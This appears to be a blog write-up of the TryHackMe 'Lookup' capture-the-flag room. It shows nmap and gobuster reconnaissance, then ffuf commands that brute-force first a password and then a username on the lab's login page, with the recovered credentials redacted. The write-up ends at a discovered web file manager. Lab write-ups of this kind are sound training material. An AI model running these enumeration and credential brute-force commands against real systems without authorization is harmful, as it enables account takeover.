---
title: "TryHackMe: Lookup"
author: cilgin
date: 2025-06-27 17:59:47 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: true
math: false
mermaid: false
image:
  path: /assets/img/2025-06-21-TryHackMe-Lookup/main.png
---

Hi guys now i'm making <https://tryhackme.com/room/lookup> room.

---

## Nmap Scan

First things first, let's make our lives a little easier. I'm exporting the target IP to an environment variable so I don't have to type it a million times.

```bash
export IP=10.10.219.52
```

With our variable set, it's time to unleash `nmap`:

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-27 17:58 +0300
Nmap scan report for 10.10.219.52
Host is up (0.074s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c1:86:69:de:5a:2b:d9:2d:e4:66:63:31:59:8c:b9:51 (RSA)
|   256 42:53:6f:97:c3:7d:bb:cc:a0:38:ed:4f:b2:73:28:32 (ECDSA)
|_  256 c4:44:35:6d:9b:51:ca:03:1b:42:0f:51:ac:34:fd:6b (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://lookup.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.29 seconds
```

```bash
curl $IP
```

But there is not output so i go to my browser and type the ip adress

It seems to be this IP adress is routing me to <http://lookup.thm>. So i add this domain to the `/etc/hosts`

And i see the website

![Desktop View](/assets/img/2025-06-21-TryHackMe-Lookup/photo1.png){: width="972" height="589" }

And i tried password:password but it didnt worked of course.

and i tried fuzzing the server with `gobuster`

```bash
❯ gobuster dir -w common.txt -u http://lookup.thm/ -x md,js,html,php,py,css,txt -t 50
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              md,js,html,php,py,css,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.php            (Status: 200) [Size: 719]
/login.php            (Status: 200) [Size: 1]
/server-status        (Status: 403) [Size: 275]
/styles.css           (Status: 200) [Size: 687]
Progress: 37912 / 37912 (100.00%)
===============================================================
Finished
===============================================================
```

There is login.php we can use brute force this webpage

If ı go the main page and try something I see username and password on http request

```text
admin=admin&password=admin
```

I guess the username is admin so we need to find the password.

I use `ffuf` to get the password.

```bash
❯ ffuf -w rockyou.txt -X POST -u http://lookup.thm/login.php -d 'username=admin&password=FUZZ' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 8

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/rockyou.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Data             : username=admin&password=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 8
________________________________________________

*************             [Status: 200, Size: 74, Words: 10, Lines: 1, Duration: 75ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
```


We know the password now

If ı try that password to log in it didnt worked.

So maybe i need to fuzz the users too.

```bash
❯ ffuf -w xato_net_usernames.txt -X POST -u http://lookup.thm/login.php -d 'username=FUZZ&password=REDACTED' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8"  -fw 10

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://lookup.thm/login.php
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/xato_net_usernames.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 :: Data             : username=FUZZ&password=REDACTED
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 10
________________________________________________

****                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 74ms]
```


I tried logging in with the credentials. And logged in but site routed me to files.lookup.thm
So i added the domain to the /etc/hosts


and ı finded some web file manager software.


![Desktop View](/assets/img/2025-06-21-TryHackMe-Lookup/photo2.png){: width="972" height="589" }



